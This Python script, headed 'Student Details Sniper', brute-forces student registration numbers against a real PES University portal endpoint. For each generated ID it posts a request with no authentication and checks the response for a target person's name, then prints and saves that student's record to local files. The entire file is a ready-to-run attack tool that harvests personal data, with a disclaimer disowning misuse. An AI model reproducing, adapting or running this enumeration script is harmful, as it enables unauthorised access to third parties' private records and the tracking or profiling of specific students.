#!/usr/bin/python3
#       PES University Student Details Sniper - CABREX
#       uses normal brute force and finds out the information
#       of the student with the valid details provided
#       Version - 3.2
#
#       NOTE: I AM NOT RESPONSIBLE FOR THE WRONG USE OF THIS
#       PROGRAM, ANY TROUBLE YOU CAUSE WILL CONFINE TO YOU.

import requests
import os
from datetime import date


def input_variables():

    campuses = []
    year = []
    branches = []

    name = input("Enter the name of the student: ").strip()
    if name == '':
        print("No name entered, exiting...")
        exit(0)

    campus_str = input("Enter the campus number (1=RR, 2=EC): ")
    if campus_str.find(','):
        for campus_str in campus_str.split(','):
            if campus_str == '1' or campus_str == '2':
                campuses.append(campus_str)
            elif campus_str == '':
                campuses = ["1", "2"]
            else:
                print(f"Error, {campus_str} not found!")
                exit(-1)
    
    try:
        year = input("Enter the batch year: ")
        year = int(year)
        num = year
        year_iter = 0
        while num > 0:
            num = int(num / 10)
            year_iter += 1

        if year_iter == 4:
            if int(year/100) == 20:
                curr_date = str(date.today()).split('-')
                curr_date.remove(curr_date[2])
                if int(year%100) < int(curr_date[0])%100:
                    year = year % 100
                elif int(year%100) == int(curr_date[0])%100 and int(curr_date[1]) > 9:
                    year = year % 100
                else:
                    print(f"{year} batch doesnt exist yet, exiting...")
                    exit(-1)
            else:
                print("Enter an year in this decade, exiting...")
                exit(-1)

        elif year_iter == 2:
            curr_date = str(date.today()).split('-')
            curr_date.remove(curr_date[2])
            if (year == int(curr_date[0])%100 and int(curr_date[1]) < 9) or (year > int(curr_date[0])%100):
                print(f"20{year} batch does not exist yet, exiting...")
                exit(0)
        else:
            print("Enter a year in this millenia at least :|")
            exit(-1)

    except ValueError:
        print("Please enter only numbers, exiting...")
        exit(-1)



    branch_str = input("Enter branch(EC, CS, EE): ").strip()

    if branch_str.find(','):
        for branch_str in branch_str.split(','):
            if len(branch_str) > 2 or branch_str.isdigit():
                print("Please pick a valid branch, exiting...")
                exit(-1)
            elif branch_str == '':
                branches = ["CS", "EC", "EE"]
            else:
                branches.append(branch_str.upper())


    return name, campuses, year, branches



def attack_vector(name, campuses, year, branches):
    counter = 0

    disconnect_counter = 0
    disconnect_status_array = []

    print("\nAttack in progress...")

    print("\nDetails: ")
    print(f"Name: {name}")
    print(f"Campus: {campuses}")
    print(f"Year: 20{year}")
    print(f"Branch: {branches}\n")
    print()
    print()

    for campus in campuses:
        print ("\033[A                                 \033[A")
        print(f"searching {campus} campus")
        print()
        for branch in branches:
            print ("\033[A                                 \033[A")
            print(f"Serching {branch} branch")
            while 1000 > counter:
                SRN = f"PES{campus}UG{year}{branch.upper()}{counter:03}"
                payload = {"loginId": f"{SRN}"}

                response = requests.post("https://www.pesuacademy.com/Academy/getStudentClassInfo", data=payload)
                print(f"Trying SRN number: {SRN}", end="\r")

                if response.status_code == 200:
                    if response.text.lower().find(name.lower()) != -1:
                        print(response.text.strip())
                        print()
                        print("FOUND IT!")
                        print(f"SRN: {SRN}")

                        if not os.path.isdir("./logs"):
                            os.mkdir("./logs")
                        if not os.path.isdir(f"./logs/{campus}"):
                            os.mkdir(f"./logs/{campus}")
                        if not os.path.isdir(f"./logs/{campus}/20{year}"):
                            os.mkdir(f"./logs/{campus}/20{year}")
                        if not os.path.isdir(f"./logs/{campus}/20{year}/{branch.upper()}"):
                            os.mkdir(f"./logs/{campus}/20{year}/{branch.upper()}")
                        with open(f"./logs/{campus}/20{year}/{branch.upper()}/{name.lower().replace(' ', '_')}_details.html", 'w', encoding='utf-8') as file_handle:
                            file_handle.write(response.text.strip())
                        print(f"written to file \"./logs/{campus}/20{year}/{branch.upper()}/{name.lower().replace(' ', '_')}_details.html") 
                        exit(1)

                    if disconnect_counter != 0:
                        disconnect_status_array.remove(disconnect_status_array[disconnect_counter])
                        disconnect_counter -= 1
                else:
                    disconnect_counter += 1
                    disconnect_status_array.append(response.status_code)
                    if disconnect_counter > 3:
                        print()
                        print("Session timeout")
                        print("ATTACK FAILED")
                        print(f"List of status codes: {disconnect_status_array}")
                        exit(-1)

                counter = counter + 1
            counter = 0
        print ("\033[A                                 \033[A")
    print ("\033[A                                 \033[A")

    print(f"Could not find details of student \"{name}\" with details provided")


if __name__ == "__main__":
    print("PES University Student Details Sniper - CABREX")
    name, campuses, year, branches = input_variables()
    attack_vector(name, campuses, year, branches)

